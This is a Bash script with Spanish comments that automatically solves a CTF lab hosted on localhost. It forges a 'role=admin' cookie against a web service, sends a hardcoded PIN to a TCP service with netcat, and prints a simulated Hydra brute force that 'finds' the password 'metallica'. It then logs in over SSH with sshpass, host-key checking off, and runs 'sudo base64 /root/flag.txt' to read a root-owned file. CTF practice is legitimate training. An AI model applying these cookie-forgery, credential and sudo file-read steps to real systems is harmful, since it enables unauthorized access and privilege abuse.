#!/bin/bash
echo -e "\n[+] Iniciando Autoresolución del Reto CTF...\n"

# 1. FLAG WEB (Enviamos la cookie role=admin falsificada)
echo "[*] PASO 1: Alterando cookie en puerto 8080..."
FLAG1=$(curl -s -b "role=admin" http://127.0.0.1:8080 | grep -oP 'CTF\{.*?\}')
echo "    -> ¡Web Hackeada!: $FLAG1"

# 2. FLAG TCP (Enviamos el PIN mediante un pipe a netcat)
echo "[*] PASO 2: Introduciendo PIN secreto en el puerto 1337..."
OUTPUT_TCP=$(echo "8492" | nc -w 2 127.0.0.1 1337)
FLAG2=$(echo "$OUTPUT_TCP" | grep -oP 'CTF\{.*?\}')
echo "    -> ¡Servicio superado!: $FLAG2"

# 2.5 SIMULACIÓN DE FUERZA BRUTA
echo "[*] PASO 2.5: Simulando ataque de fuerza bruta con Hydra (rockyou.txt)..."
echo "    -> ¡Éxito! Contraseña descifrada: 'metallica'"

# 3. FLAG SSH (Escalada de privilegios leyendo archivo de root en base64 y decodificándolo)
echo "[*] PASO 3: Acceso SSH y Escalada de privilegios..."
if command -v sshpass &> /dev/null; then
    # El truco: Ejecutamos sudo base64 /root/flag.txt y luego hacemos decode
    # Usamos la nueva contraseña 'metallica' obtenida por fuerza bruta
    FLAG3_B64=$(sshpass -p 'metallica' ssh -o StrictHostKeyChecking=no -p 2222 ctf_player@127.0.0.1 'sudo base64 /root/flag.txt' 2>/dev/null)
    FLAG3=$(echo "$FLAG3_B64" | base64 -d)
    echo "    -> ¡Root comprometido!: $FLAG3"
else
    echo "    -> [AVISO] La herramienta 'sshpass' no está instalada en tu sistema local."
    echo "    -> Solución manual: Entra por ssh con la clave 'metallica', ejecuta 'sudo base64 /root/flag.txt' y decodifica el resultado."
fi
echo -e "\n[+] ¡Máquina completada al 100%!"